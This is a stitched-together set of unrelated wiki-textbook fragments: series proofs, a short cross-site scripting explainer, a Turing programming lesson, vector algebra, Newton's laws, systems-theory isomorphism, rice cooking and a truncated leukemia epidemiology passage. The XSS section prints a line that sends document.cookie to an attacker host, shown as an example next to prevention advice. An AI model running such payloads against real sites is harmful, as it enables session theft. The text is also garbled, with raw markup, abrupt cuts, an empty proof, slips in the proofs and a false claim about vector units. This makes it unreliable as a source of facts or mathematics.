This proof seems to work except for the fact that this series will converge to &lt;math&gt;\frac{a} {1-r}&lt;/math&gt;
&lt;math&gt;\Box&lt;/math&gt;

===Theorem (p-series)===

The p-series &lt;math&gt;\sum_{n=1}^{\infty} \frac{1}{n^p}&lt;/math&gt; converges for &lt;math&gt;p&gt;1&lt;/math&gt; and diverges for &lt;math&gt;0&lt;p\le 1&lt;/math&gt;. [Note: We have technically only defined this series for p rational.  However, the theorem is still valid when p is irrational, for the same reasons]

====Proof====

First we'll consider the special cases &lt;math&gt;p = 1, p = 2&lt;/math&gt;, and then obtain the general result from these.

*If p = 1, let &lt;math&gt;x_n&lt;/math&gt; be the greatest power of 2 less than &lt;math&gt;\frac{1}{n}&lt;/math&gt;.  That is, &lt;math&gt;(x_n) = (\frac{1}{2}, \frac{1}{4},\frac{1}{4}, \frac{1}{8}, \frac{1}{8},\frac{1}{8},\frac{1}{8},\dots)&lt;/math&gt;.  

Grouping like terms together, &lt;math&gt;\sum_{i=1}^{\infty} x_n&lt;/math&gt;&lt;math&gt; = \sum_{i=0}^{\infty}(\sum_{j=2^i}^{2^{i+1}-1}x_j) &lt;/math&gt;&lt;math&gt; = \sum_{i=0}^{\infty}(\sum_{j=2^i}^{2^{i+1}-1} \frac{1}{2^{i+1}}) &lt;/math&gt;&lt;math&gt;= \sum_{i=1}^{\infty} \frac{1}{2}&lt;/math&gt;, which diverges.  

By definition, &lt;math&gt;x_n &lt; \frac{1}{n}&lt;/math&gt;, so by the comparison test &lt;math&gt; \sum_{n=1}^{\infty} \frac{1}{n}&lt;/math&gt; diverges.


*If p = 2, let &lt;math&gt;x_n = \frac{1}{n(n-1)} = \frac{1}{n-1} - \frac{1}{n}&lt;/math&gt; if n&gt;1 and 1 if n=1.  

Using the theorem on telescoping series, &lt;math&gt;\sum_{n=1}^{\infty} x_n&lt;/math&gt;&lt;math&gt; = 1 + \sum_{n=2}^{\infty}(\frac{1}{n-1} - \frac{1}{n})&lt;/math&gt;&lt;math&gt; = 1 + 1 - \lim_{n\rightarrow\infty}(1/n) = 2&lt;/math&gt;

By definition, &lt;math&gt;x_n &gt; \frac{1}{n \cdot n} = \frac{1}{n^2}&lt;/math&gt;, so by the comparison test &lt;math&gt;\sum_{n=1}^{\infty} \frac{1}{n^2}&lt;/math&gt; converges as well.


*If 0 &lt; p &lt; 1, then &lt;math&gt;\frac{1}{n^p} &gt; \frac{1}{n}&lt;/math&gt;.  By the comparison test &lt;math&gt;\sum_{n=1}^{\infty} \frac{1}{n^p}&lt;/math&gt; diverges.

===Theorem (Decimal Expansions)===
Given any real number x, &lt;math&gt;0&lt;x&lt;1&lt;/math&gt; there is a unique sequence &lt;math&gt;(x_n): \sum_{n=0}^{\infty} \frac{x_n}{10^n} = x&lt;/math&gt;, &lt;math&gt;0 \leq x_n&lt;10&lt;/math&gt; and &lt;math&gt;\forall N: \exists n \geq N: x_n \not= 9&lt;/math&gt; 

====Proof====
Inductively, assume that there exist &lt;math&gt;x_0, x_1, \dots, x_k&lt;/math&gt; such that 
&lt;math&gt;\sum_{n=0}^{k} \frac{x_n}{10^n} \leq x &lt; 
\sum_{n=0}^{k} \frac{x_n}{10^n} + \frac{1}{10^k}&lt;/math&gt;.  

Rearranging, we see that &lt;math&gt;0 \leq x - \sum_{n=0}^{k} \frac{x_n}{10^n} &lt; \frac{1}{10^k}&lt;/math&gt;, or &lt;math&gt;0 \leq (x - \sum_{n=0}^{k} \frac{x_n}{10^n})10^{k+1} &lt; 10&lt;/math&gt;.

Let &lt;math&gt;x_{k+1}&lt;/math&gt; by the greatest integer such that &lt;math&gt;x_{k+1} \leq (x - \sum_{n=0}^{k} \frac{x_n}{10^n})10^{k+1}&lt;/math&gt;.  

Then &lt;math&gt;\frac{x_{k+1}}{10^{k+1}} \leq x - \sum_{n=0}^{k} \frac{x_n}{10^n} &lt; \frac{x_{k+1}+1}{10^{k+1}}&lt;/math&gt;(otherwise, &lt;math&gt;x_{k+1}&lt;/math&gt; would not be the greatest). 

Adding &lt;math&gt;\sum_{n=0}^{k} \frac{x_n}{10^n}&lt;/math&gt;, we see that &lt;math&gt;\sum_{n=0}^{k+1} \frac{x_n}{10^n} \leq x &lt; 
\sum_{n=0}^{k+1} \frac{x_n}{10^n} + \frac{1}{10^{k+1}}&lt;/math&gt;.  

Given &lt;math&gt;\epsilon&gt;0&lt;/math&gt; pick N such that &lt;math&gt;\epsilon &gt; \frac{1}{10^N} &lt;/math&gt;.

Thus &lt;math&gt;|\sum_{n=0}^{k} \frac{x_n}{10^n} -1| &lt; \frac{1}{10^k} &lt; \epsilon&lt;/math&gt; for all &lt;math&gt;k &gt; N&lt;/math&gt;.  That is, &lt;math&gt;x = \sum_{n=0}^{\infty} \frac{x_n}{10^n} &lt;/math&gt;.

==Rearrangement of terms==

===Definition===
By a rearrangement of terms, we mean a bijection f from the natural numbers to itself. Then a rearrangement of a series &lt;math&gt;\sum_{i=0}^\infty a_n&lt;/math&gt; is any series &lt;math&gt;\sum_{i=0}^\infty a_f(n)&lt;/math&gt; where f is any rearrangement.

===Theorem===
If a series is absolutely convergent, then all rearrangements of terms converge to the same limit.

====Proof====

===Theorem===
If a series &lt;math&gt;\{a_n\}&lt;/math&gt; is conditionally convergent but not absolutely convergent, then there exists a rearrangement for any a&lt;b such that lim inf &lt;math&gt;\sum \limits_{i=0}^n a_n=a&lt;/math&gt; and such that lim sup &lt;math&gt;\sum\limits_{i=0}^n a_n=b&lt;/math&gt;

== Problem ==
Cross site scripting (or XSS) is a basic description of a script sending sensitive information (such as cookies or other session identifiers) to other websites.

Usually, these attacks affect websites that content can be edited or added to.
In most cases, session identifiers or even usernames/passwords are stored inside cookies. In the case somebody knows the session identifier, they can easily use it on their machine to do any malicious tasks that you would not be happy about.

Right now, if you are logged in on wikibooks or any other websites, go to that page and type this into the address bar:
 javascript:void(alert(document.cookie))
These are cookies that are sent to the website each time to identify you. Easily, if your site is not XSS proof - the cracker will write anything like this:
 &lt;nowiki&gt;javascript:void(document.location('http://killer.website.com/steal_cookie.php?cookie_data='+document.cookie))&lt;/nowiki&gt;
, which will send the cookie information to their website.

== Prevention ==
There are no chances to protect yourself from XSS attacks without removing malicious HTML/JavaScript code that would be submitted to another website.

As far, the most common way is to use [http://php.net/htmlentities htmlentities] or [http://php.net/htmlspecialchars htmlspecialchars] to filter the coding so nobody would add any HTML to your site (e.g. blog comments):
 $message = htmlentities($message);
Another way to do this is to overall create any kind of &quot;protected mode&quot; code, such as MediaWiki, BBCode or others that have been invented for purpose of easily styling/formatting user's content.

Another way is to replace colons in &quot;script:&quot; with &amp;amp;#58;, as well as disabling &quot;&lt;script&quot;.

      <text xml:space="preserve">'''This is a very simple program.  It will print text to the screen''', and then exit.

&lt;pre&gt;
put &quot;Hello, world!&quot;
&lt;/pre&gt;

Pretty simple, eh? As you probably deduced, &lt;code&gt;put&lt;/code&gt; prints text.  For now, we'll be using it to output to the screen.

Next, we'll learn how to gather input from the user using &lt;code&gt;get&lt;/code&gt;.  We'll also declare two variables, name and age.  The program will get the user's name and age, and repeat it back to them.

&lt;pre&gt;
var name : string %A string is text
var age : nat %Natural number

put &quot;What is your name?&quot;
get name
put &quot;&quot;
put &quot;How old are you?&quot;
get age

put &quot;Hello, &quot;, name, &quot; you are &quot;, age, &quot; years old!&quot;
&lt;/pre&gt;

First, we have to declare two variables.  Turing lets you declare variables anywhere in the program, but it's usually a good idea to declare them at the top. 

Now why was age a natural number? Why not an integer? Well, in Turing, natural numbers are all positive integers, including zero (0,1,2,3...). Integers, however, include negative numbers as well as positive numbers. The user's age shouldn't be a negative number, so it doesn't need to be an integer.

Second, did you notice the &lt;code&gt;%&lt;/code&gt; followed by some text? Those are called comments. They start at the percent-sign and continue until the end of the line. They are meant to be messages to you, the programmer, about your program. Turing doesn't care about them. They have no meaning except to the person reading the code, of which they may well be of great importance. It is important that you use meaningful comments. When you come back eight weeks later, or someone else reads your code, you may have no idea what that code you wrote meant.

After we have two variables set up, we proceed to ask the user their name...they have to know what to enter!

Then we say &lt;code&gt;get name&lt;/code&gt;.  This means, &quot;Let the user type in a string, and store it under the variable &lt;code&gt;name&lt;/code&gt; for later use.  Same for age.

Finally, we regurgitate the information back to the user.  Make sure you put spaces before closing the quotation marks, or else there won't be any spaces before and after their name and age!

One last thing: Turing uses token-oriented input.  This means that when the user inputs a space, it is treated the same as a line break.  But we don't want this in our program, because what if the user enters their first and last name? Therefore, we tell turing &quot;only get the next variable when they press enter.&quot;

To do this, replace &lt;code&gt;get name&lt;/code&gt; with &lt;code&gt;get name : *&lt;/code&gt;

      <text xml:space="preserve">==Introduction==

The study of physics is intimately tied in with the study of mathematics. Sometimes, the direction of a number or quantity is as important as the number itself.   Mathematicians in the 19th century developed a convenient way of describing and interacting with quantities with and without direction by dividing them into two types:  scalar quantities and vector quantities.  Scalar quantities have a magnitude but no direction. Vector quantities have both a magnitude and a direction. For instance, one might describe a plane as flying at 400 miles per hour. However, simply knowing the speed of the airplane is not nearly as useful as knowing the speed and direction of the airplane, so a more accurate description may be a plane flying at 400 miles per hour southeast.

==Scalar Quantities==
'''Scalar quantities''' are numbers that have a magnitude but no direction. Scalars are represented by a single letter, such as &lt;math&gt; a &lt;/math&gt;.  Some examples of scalar quantities are numbers without units ((such as ''three'')), mass (''five kilograms''), and temperature (''twenty-two degrees Celsius'').

==Vector Quantities==
'''Vectors''' are a geometric way of representing quantities that have direction as well as magnitude.  An example of a vector is force. If we are to fully describe a force on an object we need to specify not only how much force is applied, but also in which direction.  Another example of a vector quantity is velocity -- an object that is traveling at ten meters per second to the east has a different velocity than an object that is traveling ten meters per second to the west.  This vector is a special case, however,sometimes people are interested in only the magnitude of the velocity of an object.  This quantity, a scalar, is called speed which has magnitude but no given direction.  

When vectors are written, they are represented by a single letter in bold type or with an arrow above the letter, such as &lt;math&gt; \mathbf{A} &lt;/math&gt; or &lt;math&gt; \vec A &lt;/math&gt;.  Some examples of vectors are displacement (e.g. ''120 cm at 30°'') and velocity (e.g. ''12 meters per second north'').
The only basic SI unit that is a vector is the meter.  All others are scalars.  Derived quantities can be vector or scalar, but every vector quantity must involve meters in its definition and unit.

==Unit Vectors==
[[Image:Unit-vectors-in-Cartesian-Coord.png|right|thumbnail|An illustration of common choice of unit vectors in a Cartesian coordinate system]]

Strictly speaking, vectors exist separately from any coordinate systems. As vectors are geometric objects, we do not need to define a coordinate system in order to talk about vectors&amp;mdash;or even to perform most operations on vectors.  For example, consider the triple of numbers: number of apples, number of bananas, and number of carrots you have.  Say that you calculate the triple in one coordinate system and get (1,2,3).  If you rotate your coordinate system, and recalculate, you will have (1,2,3) again.  Thus, the triple does not have the most important property of a vector -- that is transform like the coordinate system.

Nevertheless, it is often convenient to introduce a coordinate system. In three dimensions, for many problems the rectangular, or Cartesian coordinate system (after French mathematician Ren&amp;eacute; Descartes) turns out to be convenient, and this coordinate system can be defined in terms of unit vectors.

A '''unit vector''' is a vector pointing in a given direction with a magnitude of one.  Essentially, it merely indicates direction.  In a Cartesian system the three unit vectors are called &lt;b&gt;i&lt;/b&gt;, &lt;b&gt;j&lt;/b&gt;, and &lt;b&gt;k&lt;/b&gt; (or, in handwriting, with a little &quot;hat&quot; on top, as &lt;math&gt;\hat{i}&lt;/math&gt;, &lt;math&gt;\hat{j}&lt;/math&gt;, and &lt;math&gt;\hat{k}&lt;/math&gt;).  Colloquially, you might refer to the directions of the unit vectors as &quot;east&quot;, &quot;north&quot;, and &quot;up&quot;.  One could just have easily chosen &lt;b&gt;i&lt;/b&gt; as up, &lt;b&gt;j&lt;/b&gt; as east, and &lt;b&gt;k&lt;/b&gt; as north.  In choosing &lt;b&gt;i&lt;/b&gt;, &lt;b&gt;j&lt;/b&gt;, and &lt;b&gt;k&lt;/b&gt;, once &lt;b&gt;i&lt;/b&gt; and &lt;b&gt;j&lt;/b&gt; are chosen, &lt;b&gt;k&lt;/b&gt; must point to a particular direction, so that a common convention called &quot;right-hand rule&quot; holds. Mathematically, this can be compactly expressed as,

&lt;center&gt;&lt;math&gt;\hat{k} = \hat{i} \times \hat{j}&lt;/math&gt;,&lt;/center&gt;

but we will expand more on this as we describe &quot;cross products&quot; later on.

Unit vectors are generally chosen to be orthogonal.  That is, each unit vector is perpendicular to each of the others. While unit vectors do not need to be orthogonal, working with a coordinate system defined by orthogonal unit vectors will be convenient in most cases. There are two other major coordinate systems used in physics&amp;mdash;cylindrical coordinates and spherical coordinates.  These will be introduced at a later time as necessary. unit vector has a magnitude of one and it has infinetely meaning in xand y

==Vector Components==
Every vector may be expressed as the sum of its &lt;i&gt;n&lt;/i&gt; unit vectors.

&lt;center&gt;&lt;math&gt;\vec{A} = a_x~\hat{i} + a_y~\hat{j} + a_z~\hat{k}&lt;/math&gt;&lt;/center&gt;

The quantities &lt;i&gt;a&lt;sub&gt;x&lt;/sub&gt;&lt;/i&gt;, &lt;i&gt;a&lt;sub&gt;y&lt;/sub&gt;&lt;/i&gt;, and &lt;i&gt;a&lt;sub&gt;z&lt;/sub&gt;&lt;/i&gt; are called the vector components of vector &lt;b&gt;A&lt;/b&gt;. Sometimes they are represented simply as an ordered triple (e.g. (&lt;i&gt;a&lt;sub&gt;x&lt;/sub&gt;&lt;/i&gt;,&lt;i&gt;a&lt;sub&gt;y&lt;/sub&gt;&lt;/i&gt;,&lt;i&gt;a&lt;sub&gt;z&lt;/sub&gt;&lt;/i&gt;)) especially when the choice and ordering of three unit vectors are not ambiguous.

==Vector Algebra==
===Negation===
[[Image:Vector-negation-and-scalar-multiplication.png|right|thumbnail|Illustration of vector negation and scalar multiplication]]
&lt;center&gt;&lt;math&gt;-\vec{A} = -(a_x~\hat{i} + a_y~\hat{j} + a_z~\hat{k}) = -a_x~\hat{i} - a_y~\hat{j} - a_z~\hat{k}&lt;/math&gt;&lt;/center&gt;

Considering a vector represented graphically by an arrow, the negative of a vector would be represented by a vector of the same length but opposite direction.

===Scalar Multiplication===
&lt;center&gt;&lt;math&gt;k\vec{A} = ka_x~\hat{i} + ka_y~\hat{j} + ka_z~\hat{k}&lt;/math&gt;&lt;/center&gt;

Note that vector negation is merely multiplication by a scalar, where that scalar is -1.  A scaled vector represented graphically would point in the same direction as the original vector but have its magnitude scaled by a factor of &lt;i&gt;k&lt;/i&gt;.

===Addition===
[[Image:Head-to-tail_Addition.png|right|thumbnail|Illustration of head-to-tail addition]]

&lt;center&gt;&lt;math&gt;\begin{align}\vec{A} + \vec{B} &amp;= (a_x~\hat{i} + a_y~\hat{j} + a_z~\hat{k}) + (b_x~\hat{i} + b_y~\hat{j} + b_z~\hat{k}) \\ &amp;= (a_x + b_x)~\hat{i} + (a_y + b_y)~\hat{j} + (a_z + b_z)~\hat{k}\end{align}&lt;/math&gt;&lt;/center&gt;

Two vectors can be added graphically by placing the tail of the second vector (here, &lt;b&gt;B&lt;/b&gt;) coincidental with the tip of the first vector (&lt;b&gt;A&lt;/b&gt;).  The resultant vector &lt;b&gt;A&lt;/b&gt; + &lt;b&gt;B&lt;/b&gt; is the vector drawn from the tail of &lt;b&gt;A&lt;/b&gt; to the tip of &lt;b&gt;B&lt;/b&gt;.

Any number of vectors can be added in this fashion.  Vector addition is commutative:

&lt;center&gt;&lt;math&gt;\vec{A} + \vec{B} + \vec{C} = \vec{C} + \vec{B} + \vec{A}&lt;/math&gt;&lt;/center&gt;

and associative:

&lt;center&gt;&lt;math&gt;(\vec{A} + \vec{B}) + \vec{C} = \vec{A} + (\vec{B} + \vec{C})&lt;/math&gt;&lt;/center&gt;

===Dot Product===
When we multiply two vectors, we can either apply a multiplication rule that produces a scalar as the end result, or one that produces a vector as the end result. The first one that produces a scalar is called '''dot product'''. In mathematical texts, this is often called ''inner product'', and some older texts will refer to this as ''scalar product'' (not to be confused with scalar multiplication); they are all the same. Dot product has all the usual properties of products, such as associativity, commutativity, and the distributive property. Geometrically, dot product is defined as:

&lt;center&gt;&lt;math&gt;\vec{A}\cdot \vec{B} = A B \cos(\theta)&lt;/math&gt;,&lt;/center&gt;

where &lt;math&gt;\theta&lt;/math&gt; is the angle between &lt;math&gt;\vec{A}&lt;/math&gt; and &lt;math&gt;\vec{B}&lt;/math&gt;. Note that since &lt;math&gt;\cos(0) = 1&lt;/math&gt;, if &lt;math&gt;\vec{A}&lt;/math&gt; is parallel to &lt;math&gt;\vec{B}&lt;/math&gt;, then &lt;math&gt;\vec{A} \cdot \vec{B} = AB&lt;/math&gt;. On the other hand, since &lt;math&gt;\cos(90^\circ) = 0&lt;/math&gt; if &lt;math&gt;\vec{A}&lt;/math&gt; is perpendicular to &lt;math&gt;\vec{B}&lt;/math&gt;, then &lt;math&gt;\vec{A} \cdot \vec{B} = 0&lt;/math&gt;. Using this as the guiding rule, we find below relationship:

&lt;center&gt;&lt;math&gt;\begin{align} \hat{i} \cdot \hat{i} = \hat{j} \cdot \hat{j} = \hat{k} \cdot \hat{k} = 1 \\ \hat{i} \cdot \hat{j} = \hat{j} \cdot \hat{k} = \hat{k} \cdot \hat{i} = 0\end{align}&lt;/math&gt;.&lt;/center&gt;

Using this, we can define dot product in terms of component vectors as follows:

&lt;center&gt;&lt;math&gt;\vec{A}\cdot\vec{B} = (A_x~\hat{i} + A_y~\hat{j} + A_z~\hat{k})\cdot(B_x~\hat{i} + B_y~\hat{j} + B_z~\hat{k}) = A_x B_x + A_y B_y + A_z B_z&lt;/math&gt;.&lt;/center&gt;

You are encouraged to expand out the multiplication explicitly, using the distributive property and find which terms cancel to zero and which products become 1.

=== Cross Product ===

The second multiplication rule for product of two vectors yields yet another vector. This multiplication rule is a very special one&amp;mdash;in fact, it is a special property of 3-dimensional space that we can define a vector multiplication is this way and still obtain a vector. This rule will not work when limited to 2-D, and in any dimensions greater than 3, an extension of this rule will not result in another vector (cf. dot product can be naturally extended or limited to any dimensions to produce a scalar). This multiplication is called '''cross product''', and in other texts, you may find terms ''outer product'' and ''vector product''. The product can be defined with the two rules, first specifying the product vector's direction, and the second specifying its magnitude:
# &lt;math&gt;\vec{A}\times\vec{B}&lt;/math&gt; is perpendicular to &lt;math&gt;\vec{A}&lt;/math&gt; and &lt;math&gt;\vec{B}&lt;/math&gt; (that is, perpendicular to the plane defined by these two vectors). This leaves two possible directions along the line perpendicular to the plane. One of the two directions is called by a &quot;right-hand rule&quot;: Hold out index finger, middle finger, and the thumb so that they are all perpendicular to each other. Let the index finger point towards direction of &lt;math&gt;\vec{A}&lt;/math&gt;, and the middle finger towards &lt;math&gt;\vec{B}&lt;/math&gt;. Then the thumb points towards the direction of &lt;math&gt;\vec{A}\times\vec{B}&lt;/math&gt;. The ordering is important here (note exchanging A and B makes the thumb point in the opposite direction).
# &lt;math&gt;|\vec{A} \times \vec{B} | = A B \sin(\theta)&lt;/math&gt;, where &lt;math&gt;\theta&lt;/math&gt; is again the angle between &lt;math&gt;\vec{A}&lt;/math&gt; and &lt;math&gt;\vec{B}&lt;/math&gt;.

Applying this definition to unit vectors again, we find following relationships:
&lt;center&gt;&lt;math&gt;\begin{align} \hat{i} \times \hat{j} &amp;= - \hat{j} \times \hat{i} = \hat{k} \\ \hat{j} \times \hat{k} &amp;= - \hat{k} \times \hat{j} = \hat{i} \\ \hat{k} \times \hat{i} &amp;= - \hat{i} \times \hat{k} = \hat{j} \\ \hat{i} \times \hat{i} &amp;= \hat{j} \times \hat{j} = \hat{k} \times \hat{k} = 0 \end{align}&lt;/math&gt;.&lt;/center&gt;
And in terms of components, we have (after a tedious algebra):
&lt;center&gt;&lt;math&gt;\vec{A} \times \vec{B} = (A_y B_z - B_y A_z)~\hat{i} + (A_z B_x - B_z A_x)~\hat{j} + (A_x B_y - B_x A_y)~\hat{k}&lt;/math&gt;.&lt;/center&gt;

It turns out we can write this complicated relationship as a [http://en.wikipedia.org/wiki/Determinant determinant] of a 3 x 3 matrix:
&lt;center&gt;&lt;math&gt;\vec{A} \times \vec{B} = \left| \begin{matrix} \hat{i} &amp; \hat{j} &amp; \hat{k} \\ A_x &amp; A_y &amp; A_z \\ B_x &amp; B_y &amp; B_z \end{matrix} \right|&lt;/math&gt;.&lt;/center&gt;
Some properties of cross product, such as &lt;math&gt;\vec{A} \times \vec{B} = - \vec{B} \times \vec{A}&lt;/math&gt; and &lt;math&gt;\vec{A} \times \vec{A} = 0&lt;/math&gt; can be derived as a property of the determinant of the matrix.

=== Useful Properties of Dot Product and Cross Product ===
Both the dot product and the cross product distribute over vector addition.

&lt;math&gt;\vec{A}\cdot(\vec{B}+\vec{C})=\vec{A}\cdot\vec{B}+\vec{A}\cdot\vec{C}&lt;/math&gt;

&lt;math&gt;\vec{A}\times(\vec{B}+\vec{C})=\vec{A}\times\vec{B}+\vec{A}\times\vec{C}&lt;/math&gt;

&lt;math&gt;(\vec{A}+\vec{B})\times\vec{C}=\vec{A}\times\vec{C}+\vec{B}\times\vec{C}&lt;/math&gt;

The dot product of two vectors is proportional to the cosine of the angle between them, and their cross product is proportional to the sine of the angle between them.

&lt;math&gt;\vec{A}\cdot\vec{B}=\|\vec{A}\|\|\vec{B}\|\cos(\theta)&lt;/math&gt;

&lt;math&gt;\|\vec{A}\times\vec{B}\|=\|\vec{A}\|\|\vec{B}\|\sin(\theta)&lt;/math&gt;

As we have seen already, the dot product is associative and commutative.

&lt;math&gt;\vec{A}\cdot(\vec{B}\cdot\vec{C})=(\vec{A}\cdot\vec{B})\cdot\vec{C}&lt;/math&gt;

&lt;math&gt;\vec{A}\cdot\vec{B}=\vec{B}\cdot\vec{A}&lt;/math&gt;

It is important to remember that the cross product has neither of these properties. Instead of being commutative, it is anticommutative.

&lt;math&gt;\vec{A}\times\vec{B}=-\vec{B}\times\vec{A}&lt;/math&gt;

The cross product is not even associative. For example, consider &lt;math&gt;(\vec{A}\times\vec{A})\times\vec{B}&lt;/math&gt;. Since the sine of the angle between &lt;math&gt;\vec{A}&lt;/math&gt; and itself is 0, &lt;math&gt;\vec{A}\times\vec{A}=\vec{0}&lt;/math&gt;, and so &lt;math&gt;(\vec{A}\times\vec{A})\times\vec{B}=\vec{0}&lt;/math&gt;. On the other hand, &lt;math&gt;\vec{A}\times(\vec{A}\times\vec{B})&lt;/math&gt; is not zero, since &lt;math&gt;\vec{A}&lt;/math&gt; and &lt;math&gt;\vec{A}\times\vec{B}&lt;/math&gt; are perpendicular. In fact, if &lt;math&gt;\vec{A}&lt;/math&gt; and &lt;math&gt;\vec{B}&lt;/math&gt; were perpendicular, its direction would be opposite to that of &lt;math&gt;\vec{B}&lt;/math&gt;. Check this yourself using the right hand rule.

The component of &lt;math&gt;\vec{A}&lt;/math&gt; parallel to &lt;math&gt;\vec{B}&lt;/math&gt; is given by

&lt;math&gt;\left(\frac{\vec{B}\cdot\vec{A}}{\vec{B}\cdot\vec{B}}\right)\vec{B}&lt;/math&gt;

and the perpendicular component of &lt;math&gt;\vec{A}&lt;/math&gt; is given by 

&lt;math&gt;\left(\frac{\vec{B}\times\vec{A}}{\vec{B}\cdot\vec{B}}\right)\times\vec{B}&lt;/math&gt;.

This leads to some interesting properties involving combinations of the products, such as

&lt;math&gt;(\vec{B}\cdot\vec{B})\vec{A}=(\vec{A}\cdot\vec{B})\vec{B}+(\vec{B}\times\vec{A})\times\vec{B}&lt;/math&gt;,

&lt;math&gt;\vec{A}\times(\vec{B}\times\vec{C})=(\vec{A}\cdot\vec{C})\vec{B}-(\vec{A}\cdot\vec{B})\vec{C}&lt;/math&gt;, and

&lt;math&gt;(\vec{A}\times\vec{B})\cdot(\vec{C}\times\vec{D})=(\vec{A}\cdot\vec{C})(\vec{B}\cdot\vec{D})-(\vec{A}\cdot\vec{D})(\vec{B}\cdot\vec{C})&lt;/math&gt;.

      <text xml:space="preserve">'''Newton's laws''' describe what causes motion of objects. There are three laws, which can be briefly stated:

* First law: In an inertial reference frame, unless acted on by a net force, an object at rest stays at rest.
* Second law: In an inertial reference frame, force is equal to mass times acceleration (&lt;math&gt;\vec{F} = m \vec{a}&lt;/math&gt;)
* Third law: For every force, there is an equal and opposite reaction force (&lt;math&gt;\vec{F}_{\mathrm ab} = - \vec{F}_{\mathrm ba}&lt;/math&gt;)

Each of these laws will be discussed in more detail in each section.

== Isomorphism ==

Isomorphism is the formal mapping between complex structures where the two structures contain equal parts. This formal mapping is a fundamental premise used in mathematics and is derived from the Greek words Isos, meaning equal, and morphe, meaning shape. Identifying isomorphic structures in science is a powerful analytical tool used to gain deeper knowledge of complex objects. Isomorphic mapping aids biological and mathematical studies where the structural mapping of complex cells and sub-graphs is used to understand equally related objects.

== Isomorphic Mapping ==

Isomorphic mapping is applied in systems theory to gain advanced knowledge of the behavior of phenomena in our world. Finding isomorphism between systems opens up a wealth of knowledge that can be shared between the analyzed systems. Systems theorists further define isomorphism to include equal behavior between two objects. Thus, isomorphic systems behave similarly when the same set of input elements is presented. As in scientific analysis, systems theorists seek out isomorphism in systems so to create a synergetic understanding of the intrinsic behavior of systems. Mastering the knowledge of how one system works and successfully mapping that system’s intrinsic structure to another releases a flow of knowledge between two critical knowledge domains.  Discovering isomorphism between a well understood and a lesser known, newly defined system can create a powerful impact in science, medicine or business since future, complex behaviors of the lesser understood system will become revealed.

== Methods ==

General systems theorists strive to find concepts, principles and patterns between differing systems so that they can be readily applied and transferred from one system to another. Systems are mathematically modeled so that the level of isomorphism can be determined. Event graphs and data flow graphs are created to represent the behavior of a system. Identical vertices and edges within the graphs are discovered to identify equal structure between systems. Identifying this isomorphism between modeled systems allows for shared abstract patterns and principles to be discovered and applied to both systems. Thus, isomorphism is a powerful element of systems theory which propagates knowledge and understanding between different groups. The archive of knowledge obtained for each system is increased. This empowers decision makers and leaders to make critical choices concerning the system in which they participate. As future behavior of a system is more well understood, good decision making concerning the potential balance and operation of a system is facilitated.

== Uses ==

Isomorphism has been used extensively in information technology as computers have evolved from simple low level circuitry with a minimal external interface to highly distributed clusters of dedicated application servers. All computer scientific concepts are derived from fundamental mathematical theory. Thus, isomorphic theory is easily applied within the computer science domain. Finding isomorphism between lesser undeveloped and current existing technologies is a powerful goal within the IT industry as scientists determine the proper path in implementing new technologies. Modeling an abstract dedicated computer or large application on paper is much less costly than building the actual instance with hardware components. Finding isomorphism within these modeled, potential computer technologies allows scientists to gain an understanding of the potential performance, drawbacks and behavior of emerging technologies. Isomorphic theory is also critical in discovering “design patterns” within applications. Computer scientists recognized similar abstract data structures and architecture types within software as programs migrated from low level assembler language to the currently used higher level languages. Patterns of equivalent technical solution architectures have been documented in detail. Modularization, functionality, interfacing, optimization, and platform related issues are identified for each common architecture so to further assist developers implementing today’s applications. Examples of common patterns include the “proxy” and “adapter” patterns. The proxy design pattern defines the best way to implement a remote object’s interface, while the adapter pattern defines how to build interface wrappers around frequently instantiated objects. Current research into powerful, new abstract solutions to industry specific applications and the protection of user security and privacy will further benefit from implementing isomorphic principles.

== Comparing real vs model ==

The most powerful use for isomorphic research occurs when comparing a synthetic model of a natural system and the real existence of that system in nature. System theorists build models to potentially solve business, engineering and scientific problems and to gain a valid representation of the natural world. These models facilitate understanding of our natural phenomena. Theorists work to build these powerful isomorphic properties between the synthetic models they create and real world phenomena. Discovering significant isomorphism between the modeled and real world facilitates our understanding of the our own world. Equal structure must exist between the man-made model and the natural system so to ensure an isomorphic link between the two systems. The defined behavior and principles built inside the synthetic model must directly parallel the natural world. Success in this analytical and philosophical drive leads man to gain a deeper understanding of himself and the natural world he lives in.</text>

The simplest way of cooking rice as a part of a main meal is to boil it. There are two main methods: the absorption technique, and the free simmering technique.

==Absorption==
This you need to experiment to get the amounts and time correct. Here's the technique that works for [[Cookbook:Basmati rice|Basmati rice]]

*Measure the rice into a saucepan that is at least four times as big as the amount of rice you need. 
*Wash the rice: nearly fill the saucepan with water, and stir the rice. The water should become somewhat cloudy as some of the starch is washed off the rice. Drain the water, and repeat a few times until the water is (almost) clear. 
*Drain the rice. You don't have to be too exact about this.
*Add cold water to the pan - about double the volume of the rice.
*Add a pinch of salt (amount depending on the amount of rice) and any other flavourings. (A crushed [[Cookbook:Cinnamon|cinnamon]] blade is nice.)
*Bring the rice to the boil, cover the pan, and let it [[Cookbook:Simmering|simmer]] for ten minutes.
*Turn off the heat, and let the rice stand for five minutes to absorb any remaining water and become soft.

This technique works for different kinds of rice but you need to work out by trial and error how much water to add, and how long to let the rice simmer. Instead of water you can use [[Cookbook:Stock|stock]] to flavour the rice.

==Free simmering==
This is a much simpler technique.

*Fill a large pot with water (at least five times the amount of rice to be cooked) and bring to a boil.
*While the water is coming to a boil, wash the rice (as above)
*When the water boils, add salt to taste and add rice.
*Boil the rice gently until it is cooked to a firmness you like (boil until swollen). Do not stir while boiling. Do not over cook (do not cook so long that it bursts).
*Drain as gently as possible (do not stir), cover, and allow to &quot;soak.&quot; Lining the inside of the lid with a cloth or paper towel assists in achieving fluffy rice.
*It can soak off heat for 10 minutes or so and be ready to be fluffed with a fork and served. Or it can soak on very low heat for up to an hour, if necessary.</text>

:[[Radiation_Oncology/NHL/CLL-SLL|Small Lymphocytic Lymphoma (SLL) / Chronic Lymphocytic Leukemia (CLL)]]

==Epidemiology==
Leukemias are the most common cancer of childhood and the number one cause of cancer related death in children. 32% of cancers in children under 15.  This varies by year, with leukemia representing 17% of cancers in the first year of life, peaking at 46% for 2-3 year olds, and 9% for nineteen year olds.  Total cases of leukemia is 7.24 per 100,000 for age 0-5, 3.8 per 100,000 for ages 5-9, decreasing to about 2.5 for ages 10-19.

Incidence in Children: (SEER 1975-1995, age-adjusted)
*Acute lymphoblastic leukemia - 2.9 per 100,000
**74% of leukemias in children. Incidence decrease
**Burkitt's lymphoma and lymphoblastic lymphoma are now considered forms of ALL.
*Acute myeloid leukemia - 0.52 per 100,000
**about 14% of leukemias in children; 
